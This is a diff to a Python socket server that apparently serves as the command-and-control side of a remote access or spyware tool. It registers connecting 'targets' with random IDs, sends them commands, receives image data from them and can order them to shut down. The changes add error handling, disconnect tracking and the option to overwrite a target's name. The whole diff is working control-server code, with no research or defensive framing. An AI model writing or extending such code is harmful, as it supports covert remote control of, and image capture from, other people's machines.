@@ -1,5 +1,4 @@
 import socket
-import sys
 from colors import *
 import struct
 from id_handler import *
@@ -26,24 +25,44 @@ class Server:
         self.serverAddress_ = ip_address
     def define_target(self, __target):
         return self.target_socket_db[__target]
-
+    def disconnect_target(self, __target, __clientSocket):
+        __clientSocket.close()
+        self.target_socket_db[__target] = None
     def shut_down(self):
-        for clientSocket in self.target_socket_db.values():
-            clientSocket.send("0".encode())
-        self.runProgram_ = False
-
+        try:
+            for target, clientSocket in self.target_socket_db.items():
+                clientSocket.send("0".encode())
+                yellow(f"Sent shutdown command to {target}")
+                clientSocket.close()
+            self.runProgram_ = False
+        finally:
+            pass
     def send_command(self, command, target):
-        clientSocket = self.define_target(target)
-        clientSocket.send(command.encode())
-
+        try:
+            clientSocket = self.define_target(target)
+            sentBytes = clientSocket.send(command.encode())
+            if sentBytes == 0:
+                red(f"{target} disconnected")
+                self.disconnect_target(target, clientSocket)
+                return False
+            return True
+        except socket.error as e:
+            red(f"Error while sending the command: {e}")
+            return False
     def receive_image_length(self, target):
-        clientSocket = self.define_target(target)
-        data = clientSocket.recv(4)
-        if len(data) < 4:
-            red("Failed to receive image length")
-            return -1
-        return struct.unpack('>I', data)[0]
-    
+        try:
+            clientSocket = self.define_target(target)
+            data = clientSocket.recv(4)
+            if not data:
+                red("Failed to receive image length")
+                self.disconnect_target(target, clientSocket)
+                return False
+            if len(data) < 4:
+                red("Failed to receive image length")
+                return False
+            return struct.unpack('>I', data)[0]
+        finally:
+            pass
     def receive_image(self, file_index, target):
         clientSocket = self.define_target(target)
         image_length = self.receive_image_length(target)
@@ -58,6 +77,8 @@ class Server:
         while len(buf) < image_length:
             data = clientSocket.recv(image_length - len(buf))
             if not data:
+                red("Failed to receive image. Target disconnected")
+                self.disconnect_target(target, clientSocket)
                 break
             buf += data
         
@@ -72,6 +93,13 @@ class Server:
 
     def start(self):
         read_ids(self.id_target_db)
+        if self.id_target_db == {}:
+            green("No targets found in the database")
+        else:
+            green("Targets found in the database")
+            for target in self.id_target_db.values():
+                red(f"Status {target}: Disconnected")
+                self.target_socket_db[target] = None
 
         self.serverSocket_.bind((self.serverAddress_, self.serverPort_))    
         self.serverSocket_.listen(self.targetCount_)
@@ -85,11 +113,22 @@ class Server:
             flag = clientSocket.recv(1).decode()
             
             if flag == "0": # Target is new. Later needs to be changed to a more secure way
-                
+                overwrite = "n"
                 yellow(f"New target connected. Info: {clientAddress} ")
-                yellow("Enter a target name for the new client (q to decline)")
-                target = input("Enter a target name for the new client: ")
-                
+                yellow("Enter a target name for the new client (q to decline)\n")
+                while True:
+                    target = input("Target name: ")
+                    if target == "":
+                        red("Target name cannot be empty")
+                        continue
+                    if target in self.id_target_db.values():
+                        red("Target name already exists")
+                        overwrite = input("Do you want to overwrite the existing target? (y/n): ")
+                        if overwrite == "y":
+                            break
+                        continue
+                    break
+
                 if target == "q": # If the user declines the connection
                     red("Connection declined")
                     clientSocket.send("0".encode())
@@ -98,26 +137,30 @@ class Server:
 
                 # Send ack flag to verify
                 clientSocket.send("1".encode())
-                # Genereate a custom target string that will correspond to the client
-                new_id = generate_random_id()
+                # Genereate a custom target string that will correspond to the target
+                if overwrite == "y":
+                    new_id = modify_id(self.id_target_db, target)
+                else:
+                    new_id = generate_random_id()
+                    add_id(self.id_target_db, target, new_id)
                 clientSocket.send(new_id.encode())
-                add_id(self.id_target_db, target, new_id)
                 self.target_socket_db[target] = clientSocket
                 green(f"New target {target} with the ID {new_id} added to the database")
 
             elif flag == "1": # If the client is not new
                 id = clientSocket.recv(16).decode() # Receive the ID of the client
-                out_ =  verify_id(id, self.id_target_db) # Verify the ID
+                target =  verify_id(id, self.id_target_db) # Verify the ID
                 
-                if out_ == False:
+                if target == False:
                     red("ID verification failed!")
                     clientSocket.send("0".encode())
                     clientSocket.close()
                     continue
                 else:
                     green("ID verification successful")
+                    green(f"Target name verified: {target}")
                     clientSocket.send("1".encode())
-                    self.target_socket_db[self.id_target_db[id]] = clientSocket
+                    self.target_socket_db[target] = clientSocket
             else:
                 red("Invalid flag received")
                 clientSocket.close()
